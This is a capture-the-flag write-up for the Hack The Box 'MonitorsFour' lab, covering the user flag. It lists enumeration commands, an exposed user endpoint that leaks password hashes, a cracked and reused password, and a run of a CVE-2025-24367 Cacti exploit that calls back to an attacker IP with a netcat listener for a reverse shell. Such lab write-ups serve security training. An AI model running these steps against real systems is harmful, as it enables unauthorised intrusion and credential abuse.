# MonitorsFour-Write-UP
Hack The Box MonitorsFour is an Easy-rated Windows machine focused on web exploitation, credential discovery, container abuse, and Docker escape techniques. The lab teaches how multiple small misconfigurations can be chained into full system compromise.

USER.TXT 


	• Enumeration : Scan Port using nmap 
	
	CMD : nmap -sS <IP>
	

	
	Http - 80 
	WinRM - 5985
	
	• Explore Webpage : But not Open because it is Resolve to = monitorsfour.htb
	
	We can set IP and Domain name in /etc/hosts File.
	
	
	• Explore Again Http Web pages : In this Web Page Found Login Page 

	
	
	
	
	• Identify Subdomains : Using TOOL = FFUF
	
	CMD :  ffuf -u http://monitorsfour.htb -H 'Host: FUZZ.monitorsfour.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -fs 138
	
	
	SUBDOMAIN : cacti 
	
	• Explore This Subdomain and Add In /etc/hosts file :
	
	
	Founded This Login Page and this Login page Version
	
	Version : 1.2.28
	
	• Directory Busting : Using Tool = Gobuster 
	
	CMD :  gobuster dir -u http://monitorsfour.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   -t 20 
	
	
	
	See these Pages on = monitorsfour.htb URL
	
	• Check User Page :  
	
	Missing Parameter Error 
	
	Try to ADD Token Parameter 
	
	/user?token=0
	
	
	Found a users Credential - Name , ID , HASH, Email, Role , etc. Details
	
	Analys Super User Role : Copy Password Hash 
	
	• Crack Password in Some Websites : crack station , Hashes.com 
	
	Hashes.com 
	
	
	Username = Admin 
	Password = Wonderful1
	
	• Login with monitorsfour.htb/login page :  
	
	
	Login Success Ful
	
	• Login With cacti.monitorsfour.htb/cacti : 
	
	Username : marcus
	Password : wonderful1
	
	
	
	Login Success Ful
	
	
	
	• Find Version Exploit : on Browsers 
	
	Version : 1.2.28
	
	
	We Found This Exploit - Cybergeek
	
	- CVE-2025-24367
	
	- Download Code - Exploit.py
	- Make it Executable 
	- Run with this Command : 
	
	ATTACKER
	CMD : python3 exploit.py -u marcus -p wonderful1 -i <ATTACKER-IP> -l 1234 -url http://cacti.monitorsfour.htb
	
	- Before this Command Start Listening on Netcap
	
	ATTACKER
	CMD : nc -nlvp 1234
	
	
	
	ACCESS Successful : With User.txt
	
	
	
USER.TXT---------------------------------------------------------------FLAG{}-----------------------------------------------------------------------<img width="1707" height="10122" alt="image" src="https://github.com/user-attachments/assets/17fed3eb-71e3-4cf4-b3b2-31173b2a6b1f" />
